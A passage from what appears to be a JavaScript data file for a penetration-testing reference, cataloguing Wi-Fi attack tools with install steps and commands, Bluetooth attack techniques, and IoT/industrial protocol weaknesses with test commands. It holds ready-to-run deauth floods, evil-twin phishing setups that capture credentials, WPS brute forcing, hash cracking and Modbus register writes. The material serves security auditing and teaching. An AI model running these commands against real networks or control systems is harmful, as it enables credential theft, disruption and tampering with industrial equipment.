      "sudo wifite                                    # Scan and attack interactively",
      "sudo wifite --wpa --dict wordlist.txt          # WPA-only with wordlist",
      "sudo wifite --wps-only                         # Attack only WPS-enabled networks",
      "sudo wifite --kill                             # Kill conflicting processes first",
      "sudo wifite -i wlan0mon --channel 6            # Specific interface and channel"
    ]
  },
  {
    name: "bettercap",
    description: "Swiss army knife for 802.11, BLE, IPv4/IPv6, and other network attacks. Provides a modular framework with an interactive shell and web UI for Wi-Fi reconnaissance, deauth, evil twin, Bluetooth scanning, ARP spoofing, DNS spoofing, and more.",
    install: "sudo apt install bettercap       # Debian/Ubuntu\nbrew install bettercap           # macOS\ngo install github.com/bettercap/bettercap@latest  # From source",
    usage: [
      "sudo bettercap -iface wlan0                   # Start on wireless interface",
      "wifi.recon on                                  # Start Wi-Fi reconnaissance",
      "wifi.show                                      # Display discovered APs and clients",
      "wifi.deauth AA:BB:CC:DD:EE:FF                 # Deauthenticate target",
      "wifi.ap on                                     # Start evil twin AP",
      "ble.recon on                                   # Start BLE reconnaissance",
      "set wifi.ap.ssid TargetSSID                    # Configure evil twin SSID"
    ]
  },
  {
    name: "fluxion",
    description: "Automated evil twin attack tool that creates a rogue AP with a phishing captive portal to capture WPA/WPA2 passphrases. Combines deauthentication with social engineering by presenting users with a fake firmware upgrade or re-authentication page.",
    install: "git clone https://github.com/FluxionNetwork/fluxion.git\ncd fluxion\nsudo bash fluxion.sh",
    usage: [
      "sudo bash fluxion.sh                           # Launch interactive menu",
      "Select target network from scan results",
      "Choose captive portal language and template",
      "Automatically deploys evil twin and deauths clients",
      "Captures and verifies WPA passphrase against handshake",
      "Stops automatically when correct passphrase is entered"
    ]
  },
  {
    name: "hostapd",
    description: "IEEE 802.11 AP management daemon that turns a wireless interface into an access point. Supports WPA/WPA2/WPA3, 802.1X/RADIUS, and multiple BSS configurations. Essential component for evil twin and rogue AP attacks. hostapd-mana is the modified version with KARMA/MANA support.",
    install: "sudo apt install hostapd         # Standard version\ngit clone https://github.com/sensepost/hostapd-mana.git  # MANA version",
    usage: [
      "hostapd /etc/hostapd/hostapd.conf              # Start AP with config file",
      "# Minimal hostapd.conf for open AP:",
      "# interface=wlan0",
      "# driver=nl80211",
      "# ssid=TestAP",
      "# hw_mode=g",
      "# channel=6",
      "hostapd-mana hostapd-mana.conf                 # Start with KARMA"
    ]
  },
  {
    name: "kismet",
    description: "Wireless network and device detector, sniffer, wardriving tool, and WIDS framework. Passively detects and collects information from 802.11, Bluetooth, Zigbee, and other wireless protocols. Provides a web-based UI and extensive logging.",
    install: "sudo apt install kismet          # Debian/Ubuntu\n# Or build from source for latest features:\ngit clone https://github.com/kismetwireless/kismet.git",
    usage: [
      "kismet -c wlan0                                # Start with wireless source",
      "kismet -c wlan0:name=wifi,hop=true             # With channel hopping",
      "kismet -c hci0:name=bluetooth                  # Bluetooth scanning",
      "# Web UI available at http://localhost:2501",
      "kismet_cap_linux_wifi --connect localhost:3501 --source wlan0",
      "kismetdb_to_pcap --in kismet-log.kismet --out output.pcap"
    ]
  },
  {
    name: "reaver",
    description: "WPS brute-force attack tool that exploits the WPS PIN vulnerability to recover WPA/WPA2 passphrases. Implements the online PIN attack and can integrate with PixieWPS for the offline PixieDust attack against vulnerable implementations.",
    install: "sudo apt install reaver          # Debian/Ubuntu\ngit clone https://github.com/t6x/reaver-wps-fork-t6x.git  # Improved fork",
    usage: [
      "wash -i wlan0mon                               # Scan for WPS-enabled APs",
      "reaver -i wlan0mon -b <AP_BSSID> -vv           # Standard brute force",
      "reaver -i wlan0mon -b <AP_BSSID> -vv -K 1      # PixieWPS offline attack",
      "reaver -i wlan0mon -b <AP_BSSID> -vv -d 2 -N   # With delay, no NACK",
      "reaver -i wlan0mon -b <AP_BSSID> -p <PIN>       # Test specific PIN"
    ]
  },
  {
    name: "bully",
    description: "Alternative to reaver for WPS brute-force attacks, often more effective against certain AP models that lock out reaver. Written in C, it handles WPS transactions differently and includes various evasion techniques for lockout mechanisms.",
    install: "sudo apt install bully           # Debian/Ubuntu\ngit clone https://github.com/aanarchyy/bully.git",
    usage: [
      "bully wlan0mon -b <AP_BSSID> -v 3              # Verbose brute force",
      "bully wlan0mon -b <AP_BSSID> -d -v 3            # PixieDust attack",
      "bully wlan0mon -b <AP_BSSID> -p <PIN> -v 3      # Test specific PIN",
      "bully wlan0mon -b <AP_BSSID> -S -v 3             # Use small DH keys"
    ]
  },
  {
    name: "hcxdumptool",
    description: "Tool for capturing PMKID hashes and EAPOL frames from Wi-Fi networks without requiring a connected client. Part of the hcxtools suite, it can extract WPA2 authentication material for offline cracking with hashcat.",
    install: "sudo apt install hcxdumptool hcxtools  # Debian/Ubuntu\ngit clone https://github.com/ZerBea/hcxdumptool.git",
    usage: [
      "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1",
      "hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=targets.txt --filtermode=2",
      "hcxpcapngtool capture.pcapng -o hash.hc22000   # Convert to hashcat format",
      "hashcat -m 22000 hash.hc22000 wordlist.txt     # Crack with hashcat",
      "hcxdumptool -i wlan0mon --do_rcascan            # Scan for active APs"
    ]
  },
  {
    name: "wifiphisher",
    description: "Automated phishing attack tool for Wi-Fi networks. Creates a rogue AP, deauthenticates clients from the legitimate network, and serves customizable phishing pages to capture credentials, deliver malware, or perform social engineering.",
    install: "git clone https://github.com/wifiphisher/wifiphisher.git\ncd wifiphisher\nsudo python3 setup.py install",
    usage: [
      "sudo wifiphisher                               # Interactive mode",
      "sudo wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade",
      "sudo wifiphisher --essid CorpWiFi -p oauth-login",
      "sudo wifiphisher -nD                            # Skip deauthentication",
      "sudo wifiphisher --handshake-capture capture.cap -p plugin-update"
    ]
  },
  {
    name: "eaphammer",
    description: "Targeted evil twin attack framework focused on stealing RADIUS credentials from WPA-Enterprise networks. Simplifies the process of deploying a rogue AP with a malicious RADIUS server for EAP credential harvesting and relay attacks.",
    install: "git clone https://github.com/s0lst1c3/eaphammer.git\ncd eaphammer\nsudo python3 setup.py install\nsudo ./eaphammer --cert-wizard",
    usage: [
      "sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid CorpWiFi --creds",
      "sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid CorpWiFi --hostile-portal",
      "sudo ./eaphammer -i wlan0 --channel 6 --auth wpa --essid TargetAP --captive-portal",
      "sudo ./eaphammer --cert-wizard                 # Generate rogue certificates"
    ]
  },
  {
    name: "mdk4",
    description: "Successor to mdk3, provides multiple Wi-Fi denial-of-service attack modes including beacon flooding, authentication DoS, deauthentication, SSID probing, and Michael (TKIP) shutdown exploitation. Useful for testing wireless infrastructure resilience.",
    install: "sudo apt install mdk4            # Debian/Ubuntu\ngit clone https://github.com/aircrack-ng/mdk4.git",
    usage: [
      "mdk4 wlan0mon b -a                             # Beacon flood (random SSIDs)",
      "mdk4 wlan0mon b -f ssids.txt                   # Beacon flood (custom SSIDs)",
      "mdk4 wlan0mon a -a <AP_BSSID>                  # Authentication flood",
      "mdk4 wlan0mon d                                # Deauthentication flood",
      "mdk4 wlan0mon d -B <AP_BSSID>                  # Targeted deauth",
      "mdk4 wlan0mon p -t <AP_BSSID>                  # SSID probing"
    ]
  },
  {
    name: "Wireshark / tshark",
    description: "Network protocol analyzer for capturing and analyzing wireless frames. With a monitor-mode capable adapter, Wireshark can decode 802.11 management, control, and data frames including EAPOL handshakes, beacon frames, and encrypted payloads (when the key is known).",
    install: "sudo apt install wireshark tshark  # Debian/Ubuntu\nbrew install wireshark              # macOS",
    usage: [
      "wireshark -i wlan0mon -k                       # Capture in monitor mode",
      "tshark -i wlan0mon -w capture.pcap             # Command-line capture",
      "tshark -r capture.pcap -Y 'eapol'              # Filter EAPOL frames",
      "tshark -r capture.pcap -Y 'wlan.fc.type_subtype == 0x0c'  # Deauth frames",
      "# Edit > Preferences > Protocols > IEEE 802.11 > Decryption keys to add WPA key",
      "tshark -o 'wlan.enable_decryption:TRUE' -o 'uat:80211_keys:\"wpa-pwd\",\"password:SSID\"' -r capture.pcap"
    ]
  },
  {
    name: "Hashcat",
    description: "Advanced password recovery tool supporting GPU-accelerated cracking of WPA/WPA2 handshakes and PMKID hashes. Supports rule-based attacks, combinator attacks, mask attacks, and distributed cracking for wireless password recovery.",
    install: "sudo apt install hashcat          # Debian/Ubuntu\nbrew install hashcat              # macOS\n# Requires OpenCL/CUDA GPU drivers for acceleration",
    usage: [
      "hashcat -m 22000 hash.hc22000 wordlist.txt                # Dictionary attack",
      "hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d       # 8-digit brute force",
      "hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule  # With rules",
      "hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d?d   # Hybrid",
      "hashcat -m 22000 hash.hc22000 --show                       # Show cracked"
    ]
  },
  {
    name: "Ubertooth",
    description: "Open-source Bluetooth monitoring platform. The Ubertooth One hardware combined with its software tools enables sniffing Bluetooth Classic and Low Energy communications, spectrum analysis, and active attacks against Bluetooth protocols.",
    install: "sudo apt install ubertooth       # Debian/Ubuntu\n# Requires Ubertooth One hardware dongle\n# Firmware update: ubertooth-dfu -d bluetooth_rxtx.dfu -r",
    usage: [
      "ubertooth-scan                                 # Scan for Bluetooth devices",
      "ubertooth-btle -f -c capture.pcap              # Sniff BLE advertisements",
      "ubertooth-btle -t <TARGET_ADDR>                # Follow specific device",
      "ubertooth-specan                               # Spectrum analyzer (2.4GHz)",
      "ubertooth-btbb -l <LAP>                        # Sniff classic BT piconet"
    ]
  },
  {
    name: "HackRF One / GNU Radio",
    description: "Software-defined radio platform operating from 1 MHz to 6 GHz. With GNU Radio, it can receive, analyze, and transmit on Wi-Fi, Bluetooth, Zigbee, Z-Wave, LoRa, and other wireless protocols. Essential for IoT protocol analysis and custom wireless attacks.",
    install: "sudo apt install hackrf gnuradio  # Debian/Ubuntu\nbrew install hackrf gnuradio      # macOS\n# Verify: hackrf_info",
    usage: [
      "hackrf_info                                    # Verify hardware connection",
      "hackrf_sweep -f 2400:2500                      # Sweep 2.4GHz band",
      "hackrf_transfer -r capture.raw -f 2412000000 -s 20000000  # Capture at 2.412GHz",
      "gnuradio-companion                             # Launch GNU Radio flowgraph editor",
      "# Use gr-ieee802-11 for Wi-Fi frame generation/analysis",
      "# Use gr-bluetooth for Bluetooth signal processing"
    ]
  },
  {
    name: "Fern Wi-Fi Cracker",
    description: "GUI-based wireless security auditing tool built on the aircrack-ng suite. Provides a graphical interface for WEP/WPA cracking, WPS attacks, and session hijacking. Suitable for users who prefer a visual workflow.",
    install: "sudo apt install fern-wifi-cracker  # Kali/Debian\ngit clone https://github.com/savio-code/fern-wifi-cracker.git",
    usage: [
      "sudo fern-wifi-cracker                         # Launch GUI",
      "Select wireless interface from dropdown",
      "Click 'Scan for Access Points'",
      "Select target and choose attack type (WEP/WPA/WPS)",
      "Configure wordlist path for WPA attacks",
      "Monitor attack progress in the GUI"
    ]
  },
  {
    name: "WiFi Pineapple",
    description: "Dedicated wireless auditing hardware platform by Hak5. Runs PineAP firmware enabling automated evil twin, KARMA, deauth, and reconnaissance attacks via a web-based management interface. Supports modules for extended functionality.",
    install: "# Hardware device - no software installation needed\n# Access web UI at http://172.16.42.1:1471\n# Update firmware: Settings > Advanced > Firmware Upgrade",
    usage: [
      "Access web UI at http://172.16.42.1:1471",
      "PineAP > Enable PineAP daemon for automated evil twin",
      "Recon > Start scanning for nearby networks and clients",
      "Tracking > Monitor target devices over time",
      "Modules > Install additional attack modules from repository",
      "Logging > Review captured credentials and traffic"
    ]
  },
  {
    name: "Scapy",
    description: "Powerful Python-based packet manipulation library capable of crafting, sending, and decoding 802.11 wireless frames. Essential for custom wireless attacks, protocol fuzzing, and building proof-of-concept exploits for Wi-Fi vulnerabilities.",
    install: "pip3 install scapy               # Python package\nsudo apt install python3-scapy    # Debian/Ubuntu",
    usage: [
      "from scapy.all import *",
      "# Craft deauth frame:",
      "pkt = RadioTap()/Dot11(addr1='FF:FF:FF:FF:FF:FF', addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)",
      "sendp(pkt, iface='wlan0mon', count=100, inter=0.1)",
      "# Sniff handshakes:",
      "sniff(iface='wlan0mon', prn=lambda p: p.summary(), filter='ether proto 0x888e')",
      "# Craft beacon frames:",
      "beacon = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)/Dot11Beacon()/Dot11Elt(ID='SSID', info='TestAP')"
    ]
  }
];

// ---------------------------------------------------------------------------
// 3. BLUETOOTH_ATTACKS — 15 Bluetooth attack techniques
// ---------------------------------------------------------------------------

const BLUETOOTH_ATTACKS = [
  {
    name: "BlueBorne",
    description: "Collection of eight zero-click vulnerabilities in Bluetooth implementations across Android, iOS, Windows, and Linux (CVE-2017-0781 through CVE-2017-0785, CVE-2017-8628, CVE-2017-14315). Allows remote code execution without pairing, requiring only that Bluetooth is enabled on the target device. No user interaction needed.",
    tool: "blueborne-scanner, armis-blueborne-scanner",
    risk: "Critical - Remote code execution without authentication or pairing. Wormable across nearby Bluetooth devices. Affects billions of devices across all major operating systems."
  },
  {
    name: "KNOB (Key Negotiation of Bluetooth)",
    description: "Force a Bluetooth Classic connection to use a 1-byte (8-bit) encryption key by manipulating the entropy negotiation during the LMP (Link Manager Protocol) key agreement. The attacker then brute-forces the weakened key in real-time. CVE-2019-9506.",
    tool: "custom LMP manipulation tools, Ubertooth, InternalBlue",
    risk: "High - Allows decryption and injection of Bluetooth Classic traffic. Affects all Bluetooth BR/EDR devices. Requires proximity and active MitM position."
  },
  {
    name: "BIAS (Bluetooth Impersonation Attacks)",
    description: "Exploit the Bluetooth Secure Simple Pairing and Secure Connections authentication procedures to impersonate a previously paired device. The attacker spoofs the Bluetooth address of a paired device and exploits role-switching vulnerabilities during authentication. CVE-2020-10135.",
    tool: "InternalBlue, custom firmware, Ubertooth",
    risk: "High - Allows impersonation of any previously paired Bluetooth device. Combined with KNOB, enables full traffic decryption. Affects Bluetooth Core Specification 2.1 through 5.2."
  },
  {
    name: "BlueSmack (Bluetooth DoS)",
    description: "Send oversized L2CAP ping (echo request) packets to a Bluetooth device, causing a buffer overflow or resource exhaustion that crashes the Bluetooth stack or the entire device. The Bluetooth equivalent of a ping-of-death attack.",
    tool: "l2ping, hcitools, custom l2cap tools",
    risk: "Medium - Denial of service against Bluetooth-enabled devices. Can crash Bluetooth stack or require device reboot. Some devices may experience broader system instability."
  },
  {
    name: "BlueSnarfing",
    description: "Unauthorized access to data on a Bluetooth-enabled device through the Object Exchange (OBEX) protocol. Exploits improperly configured OBEX services to download contacts, calendar entries, messages, and other data without the device owner's knowledge or consent.",
    tool: "bluesnarfer, obexftp, btobex",
    risk: "High - Unauthorized access to personal data including contacts, messages, emails, and calendar entries. Older devices and some IoT devices remain vulnerable due to misconfigured OBEX profiles."
  },
  {
    name: "BlueBugging",
    description: "Take control of a Bluetooth-enabled device by exploiting AT command injection through the Bluetooth serial port profile (SPP) or hands-free profile (HFP). Allows the attacker to make calls, send messages, and access data on the compromised device.",
    tool: "bluebugging tools, hcitool, rfcomm, custom AT command scripts",
    risk: "Critical - Full device control including making calls, sending SMS, reading contacts, and eavesdropping on conversations. Primarily affects older phones but some modern IoT devices expose serial profiles."
  },
  {
    name: "BLE GATT Manipulation",
    description: "Exploit insecure GATT (Generic Attribute Profile) services on BLE devices by reading, writing, or subscribing to characteristics without proper authentication. Many BLE devices expose sensitive controls (locks, medical devices, industrial equipment) through unprotected GATT services.",
    tool: "gatttool, bleah, bettercap (ble.recon), nRF Connect",
    risk: "High - Unauthorized control of BLE devices. Impact ranges from unlocking smart locks to modifying medical device settings. Many BLE devices lack authentication on GATT characteristics."
  },
  {
    name: "BLE Eavesdropping",
    description: "Passively capture BLE advertising packets and connection traffic. BLE advertisements often contain device identifiers, sensor data, and other information transmitted in cleartext. Connection traffic may also be unencrypted or use legacy pairing with crackable keys.",
    tool: "Ubertooth, btlejuice, Nordic nRF Sniffer, Wireshark (with BLE plugin)",
    risk: "Medium to High - Passive interception of BLE device data. Can reveal device locations, user behavior patterns, health data from medical wearables, and authentication tokens."
  },
  {
    name: "Bluetooth MAC Spoofing",
    description: "Clone the Bluetooth MAC address (BD_ADDR) of a legitimate device to impersonate it. This can bypass MAC-based access controls, confuse device tracking systems, or enable pairing attacks by appearing as a trusted device.",
    tool: "bdaddr, spooftooph, hciconfig, bccmd",
    risk: "Medium - Enables impersonation of trusted Bluetooth devices. Bypass MAC-based allowlists on access control systems. Prerequisite for several other Bluetooth attacks."
  },
  {
    name: "BLE Cloning (Replay Attack)",
    description: "Capture BLE advertising data and GATT service profiles from a legitimate device, then replay them from an attacker-controlled adapter. This is particularly effective against BLE beacons, access tokens, and proximity-based authentication systems.",
    tool: "btlejuice, gattacker, hackrf (for physical-layer replay), nRF52 development kit",
    risk: "High - Clone BLE access tokens, badges, and beacons. Bypass proximity-based access control. Spoof location beacons for tracking manipulation."
  },
  {
    name: "BleedingTooth",
    description: "Set of zero-click Linux kernel Bluetooth vulnerabilities (CVE-2020-12351, CVE-2020-12352, CVE-2020-24490) allowing remote code execution and information disclosure via malformed L2CAP, A2MP, and HCI advertising reports. Affects Linux kernel Bluetooth stack (BlueZ).",
    tool: "custom exploit code, proof-of-concept scripts targeting BlueZ",
    risk: "Critical - Remote code execution in the Linux kernel via Bluetooth without authentication. Affects all Linux devices with Bluetooth enabled including Android devices and IoT systems running Linux."
  },
  {
    name: "SweynTooth",
    description: "Collection of 12 BLE implementation vulnerabilities across multiple SoC vendors (Texas Instruments, NXP, Cypress, Dialog, STMicroelectronics, Microchip, Telink). Includes crashes, deadlocks, and security bypasses in the BLE link layer implementation of commercial chipsets.",
    tool: "sweyntooth attack scripts, nRF52840 dongle for BLE injection",
    risk: "High - Affects hundreds of IoT products and medical devices using vulnerable BLE chipsets. Can cause denial of service, bypass security, or enable code execution depending on the specific vulnerability."
  },
  {
    name: "BLESA (BLE Spoofing Attack)",
    description: "Exploit the BLE reconnection process where a previously bonded central device reconnects to a peripheral. The peripheral's identity is not sufficiently verified during reconnection on some implementations, allowing an attacker to spoof a legitimate peripheral and inject malicious data.",
    tool: "custom BLE tools, gattacker, btlejuice",
    risk: "Medium to High - Spoof BLE peripherals during reconnection. Inject falsified data from spoofed sensors. Affect device behavior based on manipulated BLE data."
  },
  {
    name: "Bluetooth Fuzzing",
    description: "Send malformed, unexpected, or random data to Bluetooth protocol handlers (L2CAP, SDP, RFCOMM, BNEP, AVDTP, AVCTP, HCI) to discover crashes, memory corruption, and exploitable vulnerabilities in Bluetooth stack implementations.",
    tool: "bss (Bluetooth Stack Smasher), toothpicker, frankenstein, InternalBlue",
    risk: "Variable - Discovers new zero-day vulnerabilities in Bluetooth stacks. Can cause denial of service, information disclosure, or remote code execution depending on the bugs found."
  },
  {
    name: "Bluetooth Tracking and Fingerprinting",
    description: "Track individuals by monitoring Bluetooth Classic inquiry responses and BLE advertising packets, which often contain persistent device identifiers. Even with MAC randomization, BLE devices can be fingerprinted through advertising payload patterns, timing characteristics, and physical-layer signatures.",
    tool: "Ubertooth, kismet, blue_hydra, recon-ng bluetooth modules, custom BLE scanners",
    risk: "Medium - Privacy violation through persistent device tracking. Reveals user movement patterns, daily routines, and location history. Undermines Bluetooth MAC randomization privacy protections."
  }
];

// ---------------------------------------------------------------------------
// 4. IOT_PROTOCOLS — 18 IoT protocol security profiles
// ---------------------------------------------------------------------------

const IOT_PROTOCOLS = [
  {
    name: "MQTT (Message Queuing Telemetry Transport)",
    port: 1883,
    description: "Lightweight publish/subscribe messaging protocol designed for constrained devices and low-bandwidth networks. Widely used in IoT for sensor data collection, device control, and telemetry. Uses a broker-based architecture where clients publish to and subscribe to topics.",
    vulnerabilities: [
      "Anonymous access when broker allows unauthenticated connections",
      "Cleartext credentials when not using TLS (port 1883 vs 8883)",
      "No authorization model in core protocol (any authenticated client can subscribe to any topic)",
      "Topic injection through wildcard subscriptions (# and +)",
      "Message tampering and eavesdropping without TLS",
      "Broker denial of service through connection flooding or large message payloads",
      "Retained message poisoning to serve malicious data to new subscribers",
      "Will message abuse for unauthorized notifications"
    ],
    testing: [
      "mosquitto_sub -h <broker> -t '#' -v                  # Subscribe to all topics",
      "mosquitto_pub -h <broker> -t 'test/topic' -m 'data'  # Publish test message",
      "nmap -p 1883,8883 --script mqtt-subscribe <target>   # Nmap MQTT script",
      "mqtt-pwn                                              # MQTT penetration testing tool",
      "Check for $SYS/# topic for broker statistics and version information",
      "Attempt anonymous connection (no username/password)",
      "Test wildcard subscription access: mosquitto_sub -t '+/+/#'"
    ]
  },
  {
    name: "CoAP (Constrained Application Protocol)",
    port: 5683,
    description: "RESTful protocol designed for constrained IoT devices, operating over UDP with optional DTLS encryption. Uses a request/response model similar to HTTP but with much lower overhead. Supports observe (subscribe to resource changes) and group communication via multicast.",
    vulnerabilities: [
      "No encryption by default (DTLS is optional and often not implemented)",
      "UDP amplification for DDoS attacks (CoAP responses can be larger than requests)",
      "Resource discovery via .well-known/core exposes device capabilities",
      "No authentication in base protocol",
      "Observe mechanism can be abused for traffic amplification",
      "Multicast requests can trigger responses from all devices on the network",
      "Block transfer manipulation for denial of service"
    ],
    testing: [
      "coap-client -m get coap://<target>/.well-known/core   # Resource discovery",
      "coap-client -m get coap://<target>/sensor/temp         # Read resource",
      "coap-client -m put coap://<target>/actuator/switch -e '1'  # Write resource",
      "nmap -p 5683 -sU --script coap-resources <target>     # Nmap CoAP discovery",
      "aiocoap-client coap://<target>/.well-known/core        # Python CoAP client",
      "Test multicast discovery: coap-client -m get coap://224.0.1.187/.well-known/core"
    ]
  },
  {
    name: "Modbus TCP",
    port: 502,
    description: "Industrial communication protocol originally designed for PLCs in 1979. Modbus TCP encapsulates the serial protocol in TCP/IP. Extremely common in SCADA and industrial control systems. Uses a simple master/slave (client/server) architecture with function codes for reading/writing registers and coils.",
    vulnerabilities: [
      "No authentication whatsoever in the protocol specification",
      "No encryption - all data transmitted in cleartext",
      "No integrity checking beyond basic CRC",
      "Function code abuse: any client can read/write any register",
      "Unauthorized device identification via function code 43",
      "Broadcast write commands affect all slave devices",
      "Denial of service through rapid polling or illegal function codes",
      "Lack of session management enables easy spoofing"
    ],
    testing: [
      "nmap -p 502 --script modbus-discover <target>         # Device identification",
      "modbus-cli read <target> 0 10                         # Read holding registers",
      "modbus-cli write <target> 0 12345                     # Write single register (CAUTION)",
      "mbtget -a 1 -r 0 -n 10 <target>                      # Read registers",
      "pymodbus: client = ModbusTcpClient('<target>'); client.read_holding_registers(0, 10)"
    ]
  },
  {
    name: "DNP3 (Distributed Network Protocol 3)",
    port: 20000,
    description: "Communication protocol used primarily in electric and water utility SCADA systems. Designed for reliable communication between substations and control centers over serial and IP networks. Supports unsolicited responses, time synchronization, and file transfer.",
    vulnerabilities: [
      "No authentication in standard DNP3 (Secure Authentication added in DNP3-SA)",
      "Cleartext communication without TLS wrapper",
      "Spoofing of master station commands",
      "Denial of service via malformed frames or rapid unsolicited responses",
      "Cold restart function code can reboot remote devices",
      "File transfer function can be abused for firmware manipulation",
      "Time synchronization spoofing to manipulate timestamps",
      "Sequence number prediction for session hijacking"
    ],
    testing: [
      "nmap -p 20000 --script dnp3-info <target>            # DNP3 device information",
      "aegis (DNP3 security testing tool)                    # Protocol fuzzing",
      "dnp3-master.py (custom script to send DNP3 requests)",
      "Wireshark dissector for DNP3 protocol analysis",
      "Test for unauthenticated read/write of data points",
      "Check for DNP3 Secure Authentication implementation"
    ]
  },
  {
    name: "BACnet (Building Automation and Control Network)",
    port: 47808,
    description: "Communication protocol for building automation and control systems (HVAC, lighting, fire/safety, access control). Operates over IP (BACnet/IP), MS/TP (serial), or Ethernet. Uses object-oriented data model with standardized object types and properties.",
    vulnerabilities: [
      "No authentication in BACnet/IP by default",
      "Device discovery via Who-Is/I-Am broadcast exposes all devices",
      "ReadProperty/WriteProperty commands have no access control",
      "Object enumeration reveals entire building automation topology",
      "Denial of service via rapid Who-Is broadcasts or malformed APDUs",
      "Trend log manipulation to hide unauthorized changes",
      "Schedule modification to disrupt building operations",
      "Router table manipulation in BACnet routing infrastructure"
    ],
    testing: [
      "nmap -p 47808 -sU --script bacnet-info <target>      # Device discovery",
      "BACnet browser tools for object enumeration",
      "bacnet-scan --range 192.168.1.0/24                    # Subnet BACnet scan",
      "Read device object: bacnet_read <target> device 1 object-name",
      "Enumerate objects: bacnet_read <target> device 1 object-list",
      "Test WriteProperty to analog output objects (with authorization)"
    ]
  },
  {
    name: "Zigbee (IEEE 802.15.4)",
    port: null,
    description: "Low-power wireless mesh networking protocol operating on 2.4GHz (worldwide), 915MHz (Americas), and 868MHz (Europe). Used extensively in smart home devices (lights, sensors, locks), industrial monitoring, and healthcare. Uses 128-bit AES encryption with network-wide and link-level keys.",
    vulnerabilities: [
      "Default or well-known trust center link keys (e.g., ZigBee HA key: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39)",
      "Key transport in cleartext during initial device joining",
      "Network key sniffable during key transport phase",
      "Replay attacks on encrypted frames if frame counter is not validated",
      "Insecure rejoin mechanism allows key recovery",
      "Touchlink commissioning vulnerability allows remote factory reset",
      "Limited frame counter space (32-bit) enables counter exhaustion attacks"
    ],
    testing: [
      "KillerBee framework: zbstumbler to discover Zigbee networks",
      "zbdump to capture Zigbee traffic (requires compatible hardware)",
      "zbgoodfind to extract encryption keys from firmware",
      "zbassocflood for association table denial of service",
      "Wireshark with Zigbee dissector for protocol analysis",
      "SecBee for security analysis of Zigbee networks",
      "Use ApiMote, RaspBee, or TI CC2531 USB dongle as Zigbee sniffer"
    ]
  },
  {
    name: "Z-Wave",
    port: null,
    description: "Low-power wireless protocol operating on sub-GHz frequencies (908.42MHz in US, 868.42MHz in Europe) for smart home automation. Uses mesh networking with source routing. Z-Wave S2 (Security 2) added ECDH key exchange, but many devices still use S0 or no security.",
    vulnerabilities: [
      "Z-Wave S0 uses a known key (all zeros) for initial key exchange",
      "Downgrade attack from S2 to S0 during inclusion",
      "No security (S0 or S2) on some device classes (non-listening nodes)",
      "Frame injection and replay attacks on unsecured devices",
      "Network key extraction via SDR sniffing during S0 inclusion",
      "Physical-layer jamming on the narrow sub-GHz band",
      "Controller impersonation if network key is compromised"
    ],
    testing: [
      "EZ-Wave: Z-Wave security testing tool with SDR backend",
      "OpenZWave for protocol interaction and device enumeration",
      "HackRF or RTL-SDR for Z-Wave signal capture",
      "Scapy-radio for Z-Wave frame injection",
      "Z-Wave sniffer using Zniffer (Silicon Labs tool)",
      "Test S0/S2 negotiation during device inclusion process"
    ]
  },
  {
    name: "LoRaWAN",
    port: null,
    description: "Long-range, low-power wireless protocol for IoT devices operating in sub-GHz ISM bands (868/915MHz). Designed for battery-powered sensors with ranges up to 15km. Uses AES-128 encryption with separate network session key (NwkSKey) and application session key (AppSKey).",
    vulnerabilities: [
      "ABP (Activation by Personalization) devices use static keys vulnerable to extraction",
      "Frame counter reset on ABP device reboot enables replay attacks",
      "Join-accept replay to force device onto attacker-controlled network",
      "Weak DevNonce generation enables join replay in some implementations",
      "Eavesdropping on join procedure to extract AppKey (LoRaWAN 1.0)",
      "Bit-flipping attacks on unprotected FOpts field (LoRaWAN 1.0)",
      "Denial of service via duty cycle exhaustion or jamming"
    ],
    testing: [
      "LoRa SDR tools with HackRF for signal capture and analysis",
      "ChirpStack for LoRaWAN network server testing",
      "lorawan-parser for decoding captured LoRaWAN frames",
      "LoRaWAN Auditing Framework (LAF) for security testing",
      "gr-lora GNU Radio module for LoRa demodulation",
      "Test ABP vs OTAA activation security",
      "Verify frame counter enforcement and key rotation"
    ]
  },
  {
    name: "AMQP (Advanced Message Queuing Protocol)",
    port: 5672,
    description: "Enterprise messaging protocol used for IoT message brokering, commonly implemented by RabbitMQ and Azure IoT Hub. Supports reliable message delivery with acknowledgments, transactions, and flexible routing via exchanges. TLS variant runs on port 5671.",
    vulnerabilities: [
      "Default credentials (guest/guest in RabbitMQ)",
      "Cleartext communication on port 5672 without TLS",
      "Management interface exposure (RabbitMQ on port 15672)",
      "Queue/exchange permission misconfiguration allowing unauthorized access",
      "Message injection into exchanges with weak access controls",
      "Consumer starvation attacks through exclusive queue binding",
      "Shovel/Federation misconfiguration enabling cross-broker data exfiltration",
      "Erlang cookie exposure enabling remote code execution (RabbitMQ)"
    ],
    testing: [
      "nmap -p 5672,5671,15672 <target>                     # Port discovery",
      "amqp-client tools for protocol interaction",
      "rabbitmqadmin for management API testing",
      "Test default credentials (guest/guest, admin/admin)",
      "Check management interface: curl http://<target>:15672/api/overview",
      "Enumerate vhosts, users, permissions via management API",
      "Test queue/exchange access control boundaries"
    ]
  },
  {
    name: "OPC UA (Open Platform Communications Unified Architecture)",
    port: 4840,
    description: "Industrial interoperability framework for secure, reliable data exchange in manufacturing and process automation. Replaces legacy OPC COM/DCOM with platform-independent protocol. Supports multiple transport profiles including TCP binary, HTTPS, and WebSocket.",
    vulnerabilities: [
      "Security mode 'None' allows unauthenticated, unencrypted connections",
      "Self-signed certificate acceptance without validation",
      "Anonymous authentication enabled by default on many servers",
      "Information disclosure through unrestricted node browsing",
      "Historical data access revealing operational patterns",
      "Method invocation without proper authorization checking",
      "Certificate management weaknesses enabling MitM",
      "Discovery server enumeration of all registered OPC UA servers"
    ],
    testing: [
      "opcua-client-gui for interactive server browsing",
      "python-opcua: client.connect('opc.tcp://<target>:4840')",
      "nmap --script opcua-info -p 4840 <target>             # OPC UA enumeration",
      "Test security modes: None, Sign, SignAndEncrypt",
      "Enumerate server endpoints and security policies",
